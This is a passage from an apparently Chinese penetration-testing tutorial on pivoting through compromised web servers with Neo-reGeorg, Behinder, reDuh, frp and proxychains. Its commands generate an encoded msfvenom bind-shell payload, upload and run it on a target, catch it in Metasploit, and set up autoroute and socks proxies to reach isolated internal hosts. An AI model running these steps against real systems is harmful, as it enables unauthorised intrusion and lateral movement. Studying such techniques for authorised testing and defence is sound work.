<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">python neoreg.py -k test@123 -l 0.0.0.0 -p 10081 -u http://192.168.144.211/neo-tunnel.aspx</pre></td></tr></tbody></table>

使用Neo-reGeorg后，数据包已被加密传输。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbkpMECK4FficYoQPKTbCHGobWCqyPtWBkJhHsKBaOZILXeg2zuIRkFFA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### 冰蝎 (开socks5)

冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这里同样是利用metasploit探测ms17_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。

虽然冰蝎的这种代理扫描方式不如reGeorg准确，但小线程的端口探测等是可行的，如 `auxiliary/scanner/portscan/tcp`。准确度更多是因某种探测或其他方式的数据包在传输过程中的多少而决定。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbFprm1HNOCgq6vkPQicUzCGOImLHQ0I5kccQ1URaRKWTTqwd9GH1Zqfg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### reduh (单端口转发)

当目标服务器中间件等服务版本较低，reGeorg或冰蝎马等无法正常解析，就需要换用其它的http代理脚本。这是某实战中遇到的环境：

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wbib6JVxnkC1KE8JrUpugUvFLiaZQBaKX8tY0Q2v3w9I2Be0kvOZhuxsIA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里以reduh为例，虽然只能对指定的端口进行转发 (不适用图形化连接操作)，但可以先利用msfvenom生成正向的shell payload，再结合reduh单端口转发，上线metasploit，最后利用socks4a模块开代理。

下面把具体的流程走一遍：

<table width="873" style="width: 768px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">sudo msfvenom --platform windows -p windows/shell_bind_tcp lport=53 -e x86/shikata_ga_nai -i 5 -f exe -o x86shell.exe</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;"></pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">--platform       &lt;platform&gt;       指定payload的目标平台</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">4</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">-e, --encoder    &lt;encoder&gt;        指定需要使用的编码器</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">5</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">-i, --iterations &lt;count&gt;          指定payload的编码次数</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbPwzqRUeFFIcPXoKatDWTJHCicuHzibLYF2Pjia2ov9zcmXTKnjLDA1zNg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

上传payload到目标服务器，并执行。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb5gh08aav87KkoXTVYRB9WIY7P0csSJ0e9rz8jFUAtnMekCBiajRI1rA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

metasploit是监听转发后的地址与端口。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">sudo msfconsole -q</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 &gt; use exploit/multi/handler</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; set payload windows/shell_bind_tcp</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">4</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; set rhost 127.0.0.1</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">5</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; set lport 5353</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">6</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; run -j</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbkXHZZxpW7MFnSNYZB2wdeJOCDWHpaiczwpgdlDvckIYIOksvcaPpZ3w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

reDuhServer传到目标机后，使用reDuhClient进行连接，并将反弹的端口转本地后，

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">java -jar reDuhClient.jar http://103.242.xx.xx/reduh.aspx</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;"></pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">telnet 127.0.0.1 1010</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">4</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">&gt;&gt;[createTunnel]5353:127.0.0.1:53</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbtSNYZGpR4qpRj69bicuARWmHChgnlY3ibWCCJMpKbDHStdGf1lqqHvZQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

可在metasploit渗透，或开启一个socks4a，挂载其他安全工具上继续渗透。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 auxiliary(server/socks4a) &gt; set srvport 10080</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 auxiliary(server/socks4a) &gt; run -j</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb9SZ7Z5GZBGRSSiaycezOS41iaz4Wiahcibglq7yIRRcuJDR2Hiciayl0vGvQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 注意

为什么payload要用shell，而不用meterpreter。meterpreter是高级的payload，传输中占用大量数据包，这种单端口转发上线metasploit，本就不是很稳定，meterpreter会使“小水管”更加不稳定！

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbrAFUq5wzPuKkMZyiaMmKRdg3icwticibG4kxuQnPXqiawGTnHA07RQZJbcw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

隔离网络（多级代理）
----------

内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理…

### frp

现拿到一台双网卡内网服务器权限，可以用frp建立通道，这台服务器既是服务端也是客户端。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb10dXpmRu5gSDia4liaHp0y5RboF5WwaQ01yibwC3gc2aE3pVZryK97kWw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### proxifier

用frp建立好后，结合proxifier添加两条代理：外网socks、内网socks，之后创建代理链 。(注意代理顺序)

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb1AxP6VB81lLHfNic8GBdQaZn6xpicFbEXwneMAfuiayAFAKibvicpBvblAw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

设置代理规则，选择对应代理。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbB1rficeVluqYEWuV3l7jBhJOXibpR929vQ8VOLGyQazsRIEruqttUXwA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

二层代理成功，内网隔离机445探测开放。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb7zPc7yNAEH1t2cQ3bN0GME8a2kHGp1oYFiacMrl9992FYqeHhwdmStw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### Proxychains

命令行代理神器proxychains，设置二层代理、socks口令。(注意代理顺序)

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wb7zCtBpaUKeTFbA7a4a1w72Uc3k4RNhFkaw1tFKDrGZJTdn7bK5TAiaQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

联动metasploit，ms17_010探测，可以看到代理链的传输过程。

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0Wbt5hC2a4TMVPvkHtRT0he8B9e01A3Sb9KlDj5ssbh7L4BOMibX8U5yBg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### Metasploit

针对metasploit的利用，只要sessions中的route可达，就可以直接进行多层网络渗透，更加方便。但主session掉，均掉！

在获取目标一个sessions 后，可以查看IP段信息并自动添加路由表。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; sessions 1</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">meterpreter &gt; run get_local_subnets</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">meterpreter &gt; run autoroute -p</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">4</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">meterpreter &gt; run post/multi/manage/autoroute</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">5</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">meterpreter &gt; run autoroute -p</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">6</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">meterpreter &gt; background</pre></td></tr></tbody></table>

![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbAtJFVG4iaWkzcm0OicRQBFANeUIONIpic5YYicfre2wkuAmYad3wKz5cIA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

上述是在meterpreter权限中添加，或当知道目标路由表信息时，可直接添加。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; route add 172.20.20.0/24 1 //session id 1</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; route</pre></td></tr></tbody></table>

